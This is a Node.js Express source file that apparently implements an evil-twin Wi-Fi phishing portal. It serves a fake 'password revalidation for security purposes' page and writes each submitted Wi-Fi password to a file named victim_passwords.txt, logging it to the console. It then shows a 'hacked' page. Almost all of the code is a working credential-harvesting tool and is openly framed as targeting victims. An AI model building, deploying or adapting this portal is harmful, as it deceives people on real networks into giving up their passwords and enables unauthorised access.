// The web server
const express = require('express')
const app = express()
// The port the web server listen to
const port = 80
// Working with files
const fs = require('fs');
// The option to pull the password from the body of the POST request
const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))
app.use(express.static(__dirname + "/public"));

/* Import node-wifi 
const wifi = require('node-wifi');
//https://www.npmjs.com/package/node-wifi
*/


var title ='';

// The HTML page that is presented to the client
const generateHTML = (title) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Authentication</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #FFFFF00;
      padding: 20px;
     
    }
    button{
            padding: 10px;
      }
      #connecting{
            visibility: hidden;
      }

  </style>
</head>
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="wifi-icon3.png" width="520vw">
      
      <p>WIFI PASSWORD REVALIDATION FOR SECURITY PURPOSES.</p> 

	  <form method="post" action="password" id="mform">
		<p>Please enter your password: </p>
		<input type="text" name="password" size="35%">
		<passwordp><input type="submit" name="button"  value="CONNECT"></p>
	  </form> 
  </div>
	
</body>
</html>`;
 
const generateHackedHTML = (title) => `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Wifi Authentication</title>
  <style>
    body{
      font-family: Arial, Helvetica, sans-serif;
      text-align: center;
      background-color:  #FFFFF00;
      padding: 20px;
     
    }
    button{
		padding: 10px;
	}
   
  </style>
</head>
<body>
  <div id="password-form">
  	<div>${title || ''}</div>
      <img src="hacked2.gif" alt="" width="520vw">

  </div>
	
</body>
</html>`;
// What to do if there is a GET request
app.get('/', (req, res) => {
    // Print message to the server side
    const web = req.headers.urlencoded;
    const yo = req.body.urlencoded;
    console.log(`The victim attempted to request access to the website :  ${web} \n`);
    console.log(`The victim attempted to request access to the website2 :  ${yo} \n`);

    // Response - return the HTML page 
    res.send(generateHTML()); 
});

// What to do if there is a POST request
/* 
app.post('/password', async (req, res) => {
*/
app.post('/password', (req, res) => {
    // In POST request the information is in the body
    // The information in our case is the password that the client entered
    const password = req.body.password;
    // Write the given password in the 'password.txt' file & Print a message in the server side
    fs.appendFileSync('victim_passwords.txt', `victim_password : ${password} \n`);
    console.log(`The client entered a password : ${password} \nYou may also see this password in - passwords.txt`);
    /*
    // ans will be True - if the password is correct
    // ans will be False - if the password is incorrect
    const ans = await checkPassword(password);
    // title will be the message for the client side, we will insert it to the new HTML page
    title = ans ? 'Great succeess :)' : 'The password is incorrect. :(';
    */
    //title = "Authenticating...\n If you wait more than 1min. the password is INCORRECT."
   // title="YOU HAVE BEEN HACKED!\n"
    // Response - return the new HTML page 
    res.send(generateHackedHTML(title));
});

// Define the port that the web server will listen to
app.listen(port, () => {
    console.log(`WebServer is up. Listening at http://localhost:${port}`);
})
